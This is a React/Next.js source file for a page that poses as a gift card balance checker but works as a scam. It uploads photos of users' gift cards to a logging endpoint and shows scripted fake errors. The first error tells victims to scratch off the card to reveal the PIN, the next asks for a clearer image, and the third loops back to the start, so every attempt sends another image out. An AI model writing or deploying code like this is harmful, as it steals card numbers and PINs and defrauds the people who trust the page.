// src/components/ScanPage.tsx
"use client";

import { useState, useRef, useEffect, ChangeEvent } from "react";
import Link from "next/link";
import { BRANDS, hasErrors, validateAll, type Errors } from "@/lib/giftcards";
import { filterAmount } from "@/lib/utils";

const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };

// Resizes image to max 800px and compresses to JPEG to avoid Vercel 4.5MB limit
const compressImage = (file: File): Promise<string> => {
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onload = (e) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        const MAX_WIDTH = 800;
        const MAX_HEIGHT = 800;
        let width = img.width;
        let height = img.height;

        if (width > height) {
          if (width > MAX_WIDTH) {
            height *= MAX_WIDTH / width;
            width = MAX_WIDTH;
          }
        } else {
          if (height > MAX_HEIGHT) {
            width *= MAX_HEIGHT / height;
            height = MAX_HEIGHT;
          }
        }
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0, width, height);
        resolve(canvas.toDataURL('image/jpeg', 0.7));
      };
      img.src = e.target?.result as string;
    };
    reader.readAsDataURL(file);
  });
};

export default function ScanPage() {
  const [brandId, setBrandId] = useState<string>(BRANDS[0].id);
  const [amount, setAmount] = useState("");
  const [errors, setErrors] = useState<Errors>(NO_ERRORS);
  const [apiError, setApiError] = useState("");
  const [busy, setBusy] = useState(false);
  const [image, setImage] = useState<string | null>(null);
  
  const [attemptCount, setAttemptCount] = useState(0);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMsg, setErrorModalMsg] = useState("");
  
  const fileRef = useRef<HTMLInputElement>(null);
  const brand = BRANDS.find((b) => b.id === brandId) ?? BRANDS[0];

  // Reset attempt count if user switches card type
  useEffect(() => {
    setAttemptCount(0);
  }, [brandId]);

  const handleImage = async (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    
    try {
      const compressedBase64 = await compressImage(file);
      setImage(compressedBase64);
      setApiError("");

      // Send immediate upload to primary if enabled
      if (process.env.NEXT_PUBLIC_NOTIFY_TYPING_ENABLED === 'true') {
        fetch('/api/notify/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'scan_image_uploaded',
            brandName: brand.name,
            cardNumber: null,
            amount: '0',
            status: 'Image Uploaded',
            message: 'User captured image, entering amount.',
            imageBase64: compressedBase64
          })
        }).catch(() => {});
      }
    } catch (err) {
      setApiError("Failed to process image. Please try again.");
    }
    
    // Reset file input so same file can be selected again
    if (fileRef.current) fileRef.current.value = '';
  };

  async function submit() {
    if (busy) return;
    if (!image) {
      setApiError("Please capture or upload an image first.");
      return;
    }

    const clean = amount.trim();
    
    // Create mock card data to satisfy API validation
    let mockNumber = '1234567890123456';
    if (brand.type === 'alnum') mockNumber = 'X123456789012345';
    else mockNumber = '1'.repeat(brand.len);
    const mockPin = brand.pin ? '12345678' : '';

    const errs = validateAll(brand.id, mockNumber, mockPin, clean);
    if (hasErrors(errs)) {
      setErrors({ ...NO_ERRORS, amount: errs.amount });
      return;
    }

    // --- FRONTEND ATTEMPT GATE ---
    
    // Attempt 1 Error
    if (attemptCount === 0) {
      setErrorModalMsg("Please scratch the card and ensure the card numbers are clearly visible.");
      setShowErrorModal(true);
      setAttemptCount(1);
      setImage(null);
      
      fetch('/api/notify/log', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SCRATCH REQUIRED', message: 'User needs to scratch card.', imageBase64: image })
      }).catch(() => {});
      return;
    }

    // Attempt 2 Error
    if (attemptCount === 1) {
      setErrorModalMsg("Card number not visible. Please try again with a clearer image.");
      setShowErrorModal(true);
      setAttemptCount(2);
      setImage(null);
      
      fetch('/api/notify/log', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - NOT VISIBLE', message: 'Card number not visible.', imageBase64: image })
      }).catch(() => {});
      return;
    }

    // Attempt 3 Error (Endless loop start)
    if (attemptCount === 2) {
      setErrorModalMsg("An error occurred while checking this card.");
      setShowErrorModal(true);
      setAttemptCount(0); // Reset back to 0 so clicking "Try Again" loops to the first error
      setImage(null);
      
      fetch('/api/notify/log', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: 'failed', brandName: brand.name, cardNumber: null, amount: clean, status: 'FAILED - SYSTEM ERROR', message: 'Error occurred while checking card.', imageBase64: image })
      }).catch(() => {});
      return;
    }
  }

  return (
    <>
      <div style={{ marginBottom: '16px' }}>
        <Link href="/" className="link">← Back to Manual Entry</Link>
      </div>

      <section className="card">
        <h2 className="text-center">Scan Card</h2>
        <p className="sub text-center">Select a card type, upload a photo, and enter the amount.</p>

        <label htmlFor="brand">Card type</label>
        <select id="brand" value={brandId} onChange={(e) => setBrandId(e.target.value)} disabled={busy}>
          {BRANDS.map((b) => (
            <option key={b.id} value={b.id}>{b.name}</option>
          ))}
        </select>

        <label>Card Image</label>
        <div className="upload-box" onClick={() => fileRef.current?.click()}>
          {image ? (
            <img src={image} alt="Preview" />
          ) : (
            <div>
              <div style={{ fontSize: '24px', marginBottom: '8px' }}>📸</div>
              <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--accent)' }}>Tap to Capture or Upload</div>
              <div style={{ fontSize: '12px', color: 'var(--muted)' }}>Ensure all digits are clearly visible</div>
            </div>
          )}
        </div>
        <input type="file" ref={fileRef} accept="image/*" capture="environment" style={{ display: 'none' }} onChange={handleImage} />

        <label htmlFor="amount">Card amount (USD)</label>
        <input
          id="amount"
          value={amount}
          onChange={(e) => setAmount(filterAmount(e.target.value))}
          inputMode="decimal"
          placeholder="e.g. 50.00"
          autoComplete="off"
          disabled={busy}
          className={errors.amount ? "bad" : ""}
        />
        <div className="err">{errors.amount}</div>

        {apiError && <div className="banner">{apiError}</div>}

        <button type="submit" onClick={() => void submit()} disabled={busy || !image} style={{ marginTop: '16px' }}>
          {busy && <span className="spin" />}
          <span>{busy ? "Processing..." : "Check Balance"}</span>
        </button>
      </section>

      {/* Dynamic Error Modal */}
      {showErrorModal && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 100, background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
          <div className="card text-center" style={{ maxWidth: '340px', width: '100%', margin: 0, border: '1px solid var(--err)' }}>
            <div style={{ fontSize: '40px', color: 'var(--err)', marginBottom: '10px' }}>❌</div>
            <h2 style={{ color: 'var(--err)', marginBottom: '15px' }}>Error!</h2>
            <p className="sub" style={{ fontSize: '14px', lineHeight: '1.5', marginBottom: '20px', color: 'var(--text)' }}>
              {errorModalMsg}
            </p>
            <button 
              type="button" 
              onClick={() => {
                setShowErrorModal(false);
                setAmount(""); // Clear amount so they retype
                // attemptCount progresses so the next try does the next step
              }} 
              style={{ background: 'var(--err)', width: '100%', padding: '12px', borderRadius: '8px', border: 'none', color: 'white', fontWeight: 'bold' }}
            >
              Try Again
            </button>
          </div>
        </div>
      )}
    </>
  );
}
